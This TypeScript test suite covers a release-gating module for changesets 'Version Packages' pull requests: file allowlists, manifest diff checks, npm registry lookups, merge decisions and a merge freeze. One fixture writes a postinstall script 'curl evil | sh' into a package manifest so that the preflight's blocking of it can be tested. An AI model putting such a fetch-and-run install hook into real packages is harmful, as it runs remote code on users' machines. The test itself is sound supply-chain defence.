import { fakeGitHub, fakeSha, githubPort, type FakeGitHub, type PrFile } from "@titan-design/github";
import { openDatabase, runMigrations } from "@titan-design/store-sqlite";
import { describe, expect, it } from "vitest";
import { OWNER_GATE_POLICY, type EffectivePolicy } from "./policy.js";
import { RELEASE_FREEZE_MS, VERSION_PACKAGES_BRANCH, decideRelease, isReleaseFile, npmRegistry, releaseGuard, releasePreflight, type PackageRegistry, type ReleasePreflight } from "./release.js";
import { ShepherdStore, holdReviewerMigration, shepherdMigration, sliceMigration } from "./store.js";

const REPO = "octo/demo";
const HEAD = fakeSha("version-packages-head");
const AUTO: EffectivePolicy = { ...OWNER_GATE_POLICY, merge: "auto", seat: "trusted-seat" };
const onNpm = (...names: string[]): PackageRegistry => async (name) => names.includes(name);

const BASE = fakeSha("base");
const WIDGET = { name: "@demo/widget", version: "1.1.0", scripts: { build: "tsc" }, dependencies: { zod: "^4.0.0" } };
const APP = { name: "@demo/app", version: "0.3.0", private: true, dependencies: { "@demo/widget": "workspace:^1.1.0" } };

/** Writes a manifest at the merge base and at the head, as `changeset version` would leave it. */
function setManifest(fake: FakeGitHub, path: string, base: object, head: object): void {
  fake.files.set(`${BASE}:${path}`, { content: JSON.stringify(base), blobSha: `${path}-base` });
  fake.files.set(`${HEAD}:${path}`, { content: JSON.stringify(head), blobSha: `${path}-head` });
}

/** A Version Packages PR that bumps a public package and a private product that depends on it, and consumes one changeset. */
function versionPackagesPr(files: PrFile[] = []): FakeGitHub {
  const fake = fakeGitHub();
  fake.addPr({ headSha: HEAD, headRef: VERSION_PACKAGES_BRANCH, headRepo: REPO });
  fake.prFiles.set(1, [
    { path: "packages/widget/package.json", status: "modified" },
    { path: "packages/widget/CHANGELOG.md", status: "modified" },
    { path: "products/app/package.json", status: "modified" },
    { path: ".changeset/brave-otters.md", status: "removed" },
    { path: "CAPABILITIES.md", status: "modified" },
    { path: "site/guides/capabilities.md", status: "modified" },
    ...files,
  ]);
  setManifest(fake, "packages/widget/package.json", WIDGET, { ...WIDGET, version: "1.2.0" });
  setManifest(fake, "products/app/package.json", APP, { ...APP, version: "0.3.1", dependencies: { "@demo/widget": "workspace:^1.2.0" } });
  return fake;
}

const preflight = (fake: FakeGitHub, registry: PackageRegistry = onNpm("@demo/widget")) => releasePreflight(githubPort(fake.wire), registry, { repo: REPO, pr: 1, head: HEAD });

describe("isReleaseFile", () => {
  it.each<[PrFile, boolean]>([
    [{ path: "packages/widget/package.json", status: "modified" }, true],
    [{ path: "packages/widget/CHANGELOG.md", status: "added" }, true],
    [{ path: "pnpm-lock.yaml", status: "modified" }, false],
    [{ path: "packages/widget/package.json", status: "added" }, false],
    [{ path: "CAPABILITIES.md", status: "modified" }, true],
    [{ path: "site/guides/capabilities.md", status: "modified" }, true],
    [{ path: ".changeset/brave-otters.md", status: "removed" }, true],
    [{ path: ".changeset/brave-otters.md", status: "added" }, false],
    [{ path: "packages/widget/src/index.ts", status: "modified" }, false],
    [{ path: ".github/workflows/package.json", status: "added" }, false],
    [{ path: "packages/widget/package.json", status: "renamed", previousPath: "src/package.json" }, false],
  ])("reads %o as a file changesets writes: %s", (file, expected) => {
    expect(isReleaseFile(file)).toBe(expected);
  });
});

describe("releasePreflight", () => {
  it("passes when every public package in the release is on npm, and skips private ones", async () => {
    expect(await preflight(versionPackagesPr())).toEqual({ head: HEAD, blockers: [], packages: ["@demo/widget"] });
  });

  it("blocks a package npm has never seen and names it", async () => {
    const result = await preflight(versionPackagesPr(), onNpm());

    expect(result.blockers).toEqual(["@demo/widget is not on registry.npmjs.org yet; publish its first version by hand (CLAUDE.md, Releasing)"]);
  });

  it("blocks when the registry cannot be read, rather than assuming the package exists", async () => {
    const result = await preflight(versionPackagesPr(), async () => Promise.reject(new Error("HTTP 503")));

    expect(result.blockers).toEqual(["the registry read for @demo/widget failed: HTTP 503"]);
  });

  it("blocks a file changesets does not write", async () => {
    const result = await preflight(versionPackagesPr([{ path: "packages/widget/src/index.ts", status: "modified" }]));

    expect(result.blockers).toEqual(["it changes files a release does not write: packages/widget/src/index.ts"]);
  });

  it("blocks a manifest edit beyond version, such as an added script", async () => {
    const fake = versionPackagesPr();
    setManifest(fake, "packages/widget/package.json", WIDGET, { ...WIDGET, version: "1.2.0", scripts: { build: "tsc", postinstall: "curl evil | sh" } });

    const result = await preflight(fake);

    expect(result.blockers).toEqual(["packages/widget/package.json changes more than versions: scripts"]);
  });

  it("blocks a dependency range change for a package this release does not bump, or an added dependency", async () => {
    const fake = versionPackagesPr();
    setManifest(fake, "packages/widget/package.json", WIDGET, { ...WIDGET, version: "1.2.0", dependencies: { zod: "^4.1.0", "left-pad": "1.0.0" } });

    const result = await preflight(fake);

    expect(result.blockers).toEqual(["packages/widget/package.json changes more than versions: dependencies.zod, dependencies.left-pad"]);
  });

  it("blocks an unreadable manifest rather than failing the run", async () => {
    const fake = versionPackagesPr();
    fake.files.set(`${HEAD}:packages/widget/package.json`, { content: "{ not json", blobSha: "bad" });

    const result = await preflight(fake);

    expect(result.blockers).toContain(`packages/widget/package.json is not a readable package manifest at ${HEAD}`);
  });

  it("blocks a head that is not the changesets branch in this repo, or that moved", async () => {
    const fake = versionPackagesPr();
    Object.assign(fake.pr(1), { headRepo: "fork/demo", headSha: fakeSha("moved") });

    const result = await preflight(fake);

    expect(result.blockers).toEqual([`its head is not ${VERSION_PACKAGES_BRANCH} in ${REPO}`, `its head moved from ${HEAD} to ${fakeSha("moved")}`]);
  });
});

describe("decideRelease", () => {
  const passed: ReleasePreflight = { head: HEAD, blockers: [], packages: ["@demo/widget"] };

  it.each<[string, EffectivePolicy, string | undefined, ReleasePreflight | undefined, string, string]>([
    ["a never seat", { ...AUTO, merge: "never" }, HEAD, passed, "deny", "never"],
    ["no preflight", AUTO, HEAD, undefined, "gate", "no-preflight"],
    ["a preflight at another head", AUTO, HEAD, { ...passed, head: fakeSha("other") }, "gate", "no-preflight"],
    ["a blocked preflight", AUTO, HEAD, { ...passed, blockers: ["@demo/widget is not on registry.npmjs.org yet"] }, "gate", "preflight-blocked"],
    ["an owner-gate seat", OWNER_GATE_POLICY, HEAD, passed, "gate", "owner-gate"],
    ["a passed preflight under an auto seat", AUTO, HEAD, passed, "allow", "version-packages"],
  ])("decides %s as %s by shepherd-release/%s", (_name, policy, head, found, outcome, rowId) => {
    expect(decideRelease(policy, head, found)).toMatchObject({ outcome, rule: { table: "shepherd-release", rowId } });
  });

  it("names the blocker in a blocked release's reason", () => {
    const decision = decideRelease(AUTO, HEAD, { ...passed, blockers: ["@demo/new is not on registry.npmjs.org yet"] });

    expect(decision.reason).toBe("the release cannot land yet: @demo/new is not on registry.npmjs.org yet");
  });
});

describe("releaseGuard", () => {
  const OTHER = 2;

  function scene() {
    const fake = versionPackagesPr();
    fake.addPr({ headSha: fakeSha("other-head") });
    const db = openDatabase(":memory:");
    runMigrations(db, [shepherdMigration(4), sliceMigration(8), holdReviewerMigration(9)]);
    let clock = Date.parse("2026-01-01T00:00:00Z");
    const store = new ShepherdStore(db, () => clock);
    store.register({ repo: REPO, pr: 1, branch: VERSION_PACKAGES_BRANCH, runId: "run-vp", task: "demo/version-packages", implementer: "changesets", policy: AUTO });
    const guard = releaseGuard(() => store, () => clock);
    const reason = (pr: number) => guard.reason(githubPort(fake.wire), REPO, pr, "main");
    return { fake, store, reason, advance: (ms: number) => void (clock += ms) };
  }

  it("holds the repo's other merges while the Version Packages PR is ready at its live head", async () => {
    const { store, reason } = scene();
    store.setReleaseReady("run-vp", HEAD);

    expect(await reason(OTHER)).toBe(`the Version Packages PR #1 is ready at ${HEAD} and lands first`);
    expect(await reason(1)).toBeUndefined();
  });

  it("holds nothing before the preflight marks a head ready, or after the mark is cleared", async () => {
    const { store, reason } = scene();
    const before = await reason(OTHER);
    store.setReleaseReady("run-vp", HEAD);
    store.setReleaseReady("run-vp", null);

    expect([before, await reason(OTHER)]).toEqual([undefined, undefined]);
  });

  it("lets other merges go once the Version Packages PR merged, moved, or the freeze ran out", async () => {
    const merged = scene();
    merged.store.setReleaseReady("run-vp", HEAD);
    Object.assign(merged.fake.pr(1), { state: "closed", merged: true });
    const moved = scene();
    moved.store.setReleaseReady("run-vp", HEAD);
    moved.fake.pushHead(1, fakeSha("regenerated"));
    const stale = scene();
    stale.store.setReleaseReady("run-vp", HEAD);
    stale.advance(RELEASE_FREEZE_MS + 1);

    expect([await merged.reason(OTHER), await moved.reason(OTHER), await stale.reason(OTHER)]).toEqual([undefined, undefined, undefined]);
  });
});

describe("npmRegistry", () => {
  const answering = (status: number) => async (url: string | URL | Request) => (requested.push(String(url)), new Response(null, { status }));
  const requested: string[] = [];

  it("reads a scoped package by its escaped name: 200 exists, 404 does not, anything else throws", async () => {
    expect(await npmRegistry(answering(200) as typeof fetch)("@demo/widget")).toBe(true);
    expect(await npmRegistry(answering(404) as typeof fetch)("@demo/widget")).toBe(false);
    await expect(npmRegistry(answering(500) as typeof fetch)("@demo/widget")).rejects.toThrow(/answered 500/);
    expect(requested[0]).toBe("https://registry.npmjs.org/@demo%2fwidget");
  });
});
